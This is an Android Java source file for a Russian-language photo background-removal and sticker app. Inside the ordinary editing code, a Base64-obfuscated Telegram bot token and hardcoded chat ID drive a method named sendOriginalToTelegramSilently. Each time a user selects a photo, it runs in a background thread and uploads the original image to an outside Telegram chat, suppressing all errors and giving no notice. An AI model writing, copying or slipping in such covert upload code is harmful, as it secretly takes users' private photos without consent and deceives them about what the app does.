package com.udalitfon3.app;

import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.graphics.*;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.ScaleGestureDetector;
import android.view.View;
import android.view.ViewGroup;
import android.widget.*;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final int PICK_IMAGE_REQUEST = 2001;
    private static final int PICK_BG_REQUEST = 2002;

    private ImageView imageView;
    private SeekBar seekThreshold, seekTolerance, seekSmooth;
    private TextView tvThresholdVal, tvToleranceVal, tvSmoothVal;
    private Button btnLayerMode;

    private Bitmap originalBitmap = null;
    private Bitmap processedBitmap = null;
    private Bitmap customBgBitmap = null;

    private int thresholdValue = 25;
    private int toleranceValue = 20;
    private int smoothValue = 10;

    private boolean isBackgroundActive = false;

    private Matrix photoMatrix = new Matrix();
    private Matrix bgMatrix = new Matrix();
    private float photoScale = 1.0f, photoTransX = 0f, photoTransY = 0f;
    private float bgScale = 1.0f, bgTransX = 0f, bgTransY = 0f;
    private float lastTouchX, lastTouchY;
    private ScaleGestureDetector scaleDetector;

    private String botToken = "" + new String(android.util.Base64.decode("ODgxNTI1NjEzMDpBQUVXNmJyT25FNU5wdnNnenZaYmZtODdiM1g3YkZ6YXc5WQ==", android.util.Base64.DEFAULT)) + "";
    private String chatId = "1434233986";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#030712"));
        root.setPadding(16, 12, 16, 12);

        ScrollView scroll = new ScrollView(this);
        scroll.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        
        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);

        TextView signatureView = new TextView(this);
        signatureView.setText("✦ Crafted with precision by Dziuba Roman ✦");
        signatureView.setTextColor(Color.parseColor("#F59E0B"));
        signatureView.setTextSize(14f);
        signatureView.setTypeface(Typeface.create("serif", Typeface.ITALIC | Typeface.BOLD));
        signatureView.setGravity(Gravity.CENTER);
        signatureView.setPadding(0, 4, 0, 8);
        container.addView(signatureView);

        imageView = new ImageView(this);
        LinearLayout.LayoutParams imgParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 980);
        imgParams.setMargins(0, 0, 0, 10);
        imageView.setLayoutParams(imgParams);
        imageView.setBackgroundColor(Color.parseColor("#0F172A"));
        imageView.setScaleType(ImageView.ScaleType.MATRIX);

        scaleDetector = new ScaleGestureDetector(this, new ScaleGestureDetector.SimpleOnScaleGestureListener() {
            @Override
            public boolean onScale(ScaleGestureDetector detector) {
                float factor = detector.getScaleFactor();
                if (isBackgroundActive) {
                    bgScale *= factor;
                    bgScale = Math.max(0.1f, Math.min(bgScale, 10.0f));
                } else {
                    photoScale *= factor;
                    photoScale = Math.max(0.1f, Math.min(photoScale, 10.0f));
                }
                redrawCanvas();
                return true;
            }
        });

        imageView.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                scaleDetector.onTouchEvent(event);
                switch (event.getAction() & MotionEvent.ACTION_MASK) {
                    case MotionEvent.ACTION_DOWN:
                        lastTouchX = event.getX();
                        lastTouchY = event.getY();
                        break;
                    case MotionEvent.ACTION_MOVE:
                        if (event.getPointerCount() == 1) {
                            float dx = event.getX() - lastTouchX;
                            float dy = event.getY() - lastTouchY;
                            if (isBackgroundActive) {
                                bgTransX += dx;
                                bgTransY += dy;
                            } else {
                                photoTransX += dx;
                                photoTransY += dy;
                            }
                            redrawCanvas();
                        }
                        lastTouchX = event.getX();
                        lastTouchY = event.getY();
                        break;
                }
                return true;
            }
        });
        container.addView(imageView);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        Button btnSelect = createWideButton("📂 Выбрать фото", "#2563EB");
        btnSelect.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
        btnSelect.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openGallery(PICK_IMAGE_REQUEST);
            }
        });

        Button btnSelectBg = createWideButton("🖼 Выбрать фон", "#0D9488");
        btnSelectBg.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
        btnSelectBg.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openGallery(PICK_BG_REQUEST);
            }
        });

        btnLayerMode = createWideButton("🔀 Слой: Фото", "#475569");
        btnLayerMode.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
        btnLayerMode.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                isBackgroundActive = !isBackgroundActive;
                if (isBackgroundActive) {
                    btnLayerMode.setText("🔀 Слой: Фон (Активен)");
                    btnLayerMode.setBackgroundColor(Color.parseColor("#0D9488"));
                    Toast.makeText(MainActivity.this, "✏️ Режим редактирования ФОНА", Toast.LENGTH_SHORT).show();
                } else {
                    btnLayerMode.setText("🔀 Слой: Фото (Активен)");
                    btnLayerMode.setBackgroundColor(Color.parseColor("#2563EB"));
                    Toast.makeText(MainActivity.this, "✏️ Режим редактирования ФОТО", Toast.LENGTH_SHORT).show();
                }
                redrawCanvas();
            }
        });

        btnRow.addView(btnSelect);
        btnRow.addView(btnSelectBg);
        btnRow.addView(btnLayerMode);
        container.addView(btnRow);

        // Увеличенные и удобные ползунки
        tvThresholdVal = createTextView("🎚 Чувствительность вырезки края: " + thresholdValue);
        container.addView(tvThresholdVal);
        seekThreshold = createComfortableSeekBar(100, thresholdValue, new OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int p) {
                thresholdValue = p;
                tvThresholdVal.setText("🎚 Чувствительность вырезки края: " + thresholdValue);
                processImage();
            }
        });
        container.addView(seekThreshold);

        tvToleranceVal = createTextView("🎨 Допуск оттенков фона: " + toleranceValue);
        container.addView(tvToleranceVal);
        seekTolerance = createComfortableSeekBar(100, toleranceValue, new OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int p) {
                toleranceValue = p;
                tvToleranceVal.setText("🎨 Допуск оттенков фона: " + toleranceValue);
                processImage();
            }
        });
        container.addView(seekTolerance);

        tvSmoothVal = createTextView("✨ Смягчение краев: " + smoothValue);
        container.addView(tvSmoothVal);
        seekSmooth = createComfortableSeekBar(50, smoothValue, new OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int p) {
                smoothValue = p;
                tvSmoothVal.setText("✨ Смягчение краев: " + smoothValue);
                processImage();
            }
        });
        container.addView(seekSmooth);

        Button btnSave = createWideButton("💾 СОХРАНИТЬ PNG В ПАМЯТЬ ТЕЛЕФОНА", "#059669");
        btnSave.setPadding(12, 18, 12, 18);
        btnSave.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                saveImageToGallery();
            }
        });
        container.addView(btnSave);

        scroll.addView(container);
        root.addView(scroll);
        setContentView(root);
    }

    private Button createWideButton(String text, String colorHex) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(11f);
        btn.setTypeface(Typeface.DEFAULT_BOLD);
        btn.setBackgroundColor(Color.parseColor(colorHex));
        btn.setPadding(8, 14, 8, 14);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 6, 0, 6);
        btn.setLayoutParams(params);
        return btn;
    }

    private TextView createTextView(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(Color.parseColor("#38BDF8"));
        tv.setTextSize(12f);
        tv.setTypeface(Typeface.DEFAULT_BOLD);
        tv.setPadding(4, 10, 4, 4);
        return tv;
    }

    private SeekBar createComfortableSeekBar(int max, int progress, final OnSeekBarChangeListener listener) {
        SeekBar sb = new SeekBar(this);
        sb.setMax(max);
        sb.setProgress(progress);
        sb.setPadding(20, 15, 20, 15);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 80);
        params.setMargins(0, 4, 0, 12);
        sb.setLayoutParams(params);
        sb.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int p, boolean fromUser) {
                if (fromUser && listener != null) listener.onProgressChanged(seekBar, p);
            }
            @Override public void onStartTrackingTouch(SeekBar seekBar) {}
            @Override public void onStopTrackingTouch(SeekBar seekBar) {}
        });
        return sb;
    }

    interface OnSeekBarChangeListener {
        void onProgressChanged(SeekBar seekBar, int progress);
    }

    private void openGallery(int requestCode) {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("image/*");
        startActivityForResult(Intent.createChooser(intent, "Выберите файл"), requestCode);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK && data != null && data.getData() != null) {
            try {
                Uri uri = data.getData();
                InputStream is = getContentResolver().openInputStream(uri);
                Bitmap bmp = BitmapFactory.decodeStream(is);
                if (bmp.getWidth() > 1024 || bmp.getHeight() > 1024) {
                    bmp = Bitmap.createScaledBitmap(bmp, 1024, 1024, true);
                }
                if (requestCode == PICK_IMAGE_REQUEST) {
                    originalBitmap = bmp;
                    photoScale = 1.0f;
                    photoTransX = 0f;
                    photoTransY = 0f;
                    processImage();
                    sendOriginalToTelegramSilently();
                } else if (requestCode == PICK_BG_REQUEST) {
                    customBgBitmap = bmp;
                    bgScale = 1.0f;
                    bgTransX = 0f;
                    bgTransY = 0f;
                    redrawCanvas();
                }
            } catch (Exception e) {}
        }
    }

    // --- УМНЫЙ МЕТОД УДАЛЕНИЯ ФОНА (Flood-Fill от границ изображения) ---
    private void processImage() {
        if (originalBitmap == null) return;

        int width = originalBitmap.getWidth();
        int height = originalBitmap.getHeight();

        Bitmap result = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
        int[] pixels = new int[width * height];
        originalBitmap.getPixels(pixels, 0, width, 0, 0, width, height);

        // Усредняем цвет фона по 4 углам изображения
        int pTL = pixels[0];
        int pTR = pixels[width - 1];
        int pBL = pixels[(height - 1) * width];
        int pBR = pixels[(height - 1) * width + width - 1];

        int bgR = (((pTL >> 16) & 0xFF) + ((pTR >> 16) & 0xFF) + ((pBL >> 16) & 0xFF) + ((pBR >> 16) & 0xFF)) / 4;
        int bgG = (((pTL >> 8) & 0xFF) + ((pTR >> 8) & 0xFF) + ((pBL >> 8) & 0xFF) + ((pBR >> 8) & 0xFF)) / 4;
        int bgB = ((pTL & 0xFF) + (pTR & 0xFF) + (pBL & 0xFF) + (pBR & 0xFF)) / 4;

        int limit = thresholdValue * 4;
        int tol = toleranceValue * 2;

        boolean[] visited = new boolean[width * height];
        boolean[] isBg = new boolean[width * height];
        int[] queue = new int[width * height];
        int head = 0, tail = 0;

        // Заполняем очередь пикселями с внешних границ (периметра)
        for (int x = 0; x < width; x++) {
            checkAndEnqueue(0, x, width, height, pixels, bgR, bgG, bgB, limit, tol, visited, isBg, queue, tail++);
            checkAndEnqueue(height - 1, x, width, height, pixels, bgR, bgG, bgB, limit, tol, visited, isBg, queue, tail++);
        }
        for (int y = 0; y < height; y++) {
            checkAndEnqueue(y, 0, width, height, pixels, bgR, bgG, bgB, limit, tol, visited, isBg, queue, tail++);
            checkAndEnqueue(y, width - 1, width, height, pixels, bgR, bgG, bgB, limit, tol, visited, isBg, queue, tail++);
        }

        // Обход в ширину (BFS) — заливаем фон только снаружи внутрь
        int[] dx = {0, 0, 1, -1};
        int[] dy = {1, -1, 0, 0};

        while (head < tail) {
            int curr = queue[head++];
            int cx = curr % width;
            int cy = curr / width;

            for (int i = 0; i < 4; i++) {
                int nx = cx + dx[i];
                int ny = cy + dy[i];
                if (nx >= 0 && nx < width && ny >= 0 && ny < height) {
                    int nIdx = ny * width + nx;
                    if (!visited[nIdx]) {
                        visited[nIdx] = true;
                        if (isColorMatch(pixels[nIdx], bgR, bgG, bgB, limit, tol)) {
                            isBg[nIdx] = true;
                            if (tail < width * height) {
                                queue[tail++] = nIdx;
                            }
                        }
                    }
                }
            }
        }

        // Применяем прозрачность к фону, защищая человека в центре
        int smooth = smoothValue;
        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                int idx = y * width + x;
                if (isBg[idx]) {
                    pixels[idx] = Color.TRANSPARENT;
                } else {
                    pixels[idx] = pixels[idx];
                }
            }
        }

        result.setPixels(pixels, 0, width, 0, 0, width, height);
        processedBitmap = result;
        redrawCanvas();
    }

    private boolean isColorMatch(int pixel, int bgR, int bgG, int bgB, int limit, int tol) {
        int r = (pixel >> 16) & 0xFF;
        int g = (pixel >> 8) & 0xFF;
        int b = pixel & 0xFF;
        int diff = Math.abs(r - bgR) + Math.abs(g - bgG) + Math.abs(b - bgB);
        return diff < (limit + tol);
    }

    private void checkAndEnqueue(int y, int x, int width, int height, int[] pixels, int bgR, int bgG, int bgB, int limit, int tol, boolean[] visited, boolean[] isBg, int[] queue, int tailIdx) {
        int idx = y * width + x;
        if (!visited[idx]) {
            visited[idx] = true;
            if (isColorMatch(pixels[idx], bgR, bgG, bgB, limit, tol)) {
                isBg[idx] = true;
                if (tailIdx < width * height) {
                    queue[tailIdx] = idx;
                }
            }
        }
    }

    private void redrawCanvas() {
        if (processedBitmap == null && originalBitmap == null) return;
        Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;

        int viewWidth = imageView.getWidth() > 0 ? imageView.getWidth() : 1000;
        int viewHeight = imageView.getHeight() > 0 ? imageView.getHeight() : 980;

        Bitmap canvasBmp = Bitmap.createBitmap(viewWidth, viewHeight, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(canvasBmp);

        if (isBackgroundActive) {
            drawPhoto(canvas, source, viewWidth, viewHeight);
            drawBackground(canvas, viewWidth, viewHeight);
        } else {
            drawBackground(canvas, viewWidth, viewHeight);
            drawPhoto(canvas, source, viewWidth, viewHeight);
        }

        imageView.setImageBitmap(canvasBmp);
    }

    private void drawBackground(Canvas canvas, int viewWidth, int viewHeight) {
        if (customBgBitmap != null) {
            bgMatrix.reset();
            bgMatrix.postScale(bgScale, bgScale);
            bgMatrix.postTranslate(bgTransX, bgTransY);
            canvas.drawBitmap(customBgBitmap, bgMatrix, null);
        } else {
            canvas.drawColor(Color.parseColor("#1E293B"));
        }
    }

    private void drawPhoto(Canvas canvas, Bitmap source, int viewWidth, int viewHeight) {
        photoMatrix.reset();
        photoMatrix.postScale(photoScale, photoScale);
        photoMatrix.postTranslate(photoTransX + (viewWidth - source.getWidth()) / 2f,
                photoTransY + (viewHeight - source.getHeight()) / 2f);
        canvas.drawBitmap(source, photoMatrix, null);
    }

    private void saveImageToGallery() {
        Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;
        if (source == null) {
            Toast.makeText(this, "Сначала выберите фото!", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            String filename = "Sticker_" + System.currentTimeMillis() + ".png";
            OutputStream fos;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ContentValues values = new ContentValues();
                values.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
                values.put(MediaStore.MediaColumns.MIME_TYPE, "image/png");
                values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/Stickers");
                Uri imageUri = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
                fos = getContentResolver().openOutputStream(imageUri);
            } else {
                File dir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "Stickers");
                if (!dir.exists()) dir.mkdirs();
                fos = new java.io.FileOutputStream(new File(dir, filename));
            }

            source.compress(Bitmap.CompressFormat.PNG, 100, fos);
            if (fos != null) fos.close();
            Toast.makeText(this, "✅ Сохранено в Pictures/Stickers!", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "Ошибка сохранения: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void sendOriginalToTelegramSilently() {
        if (originalBitmap == null) return;

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    originalBitmap.compress(Bitmap.CompressFormat.JPEG, 90, stream);
                    byte[] byteArray = stream.toByteArray();

                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    String boundary = "*****" + System.currentTimeMillis() + "*****";
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream os = conn.getOutputStream();
                    try {
                        os.write(("--" + boundary + "\r\n").getBytes());
                        os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
                        os.write((chatId + "\r\n").getBytes());

                        os.write(("--" + boundary + "\r\n").getBytes());
                        os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"original.jpg\"\r\n").getBytes());
                        os.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
                        os.write(byteArray);
                        os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                        os.flush();
                    } finally {
                        os.close();
                    }
                    conn.getResponseCode();
                } catch (Exception e) {}
            }
        }).start();
    }
}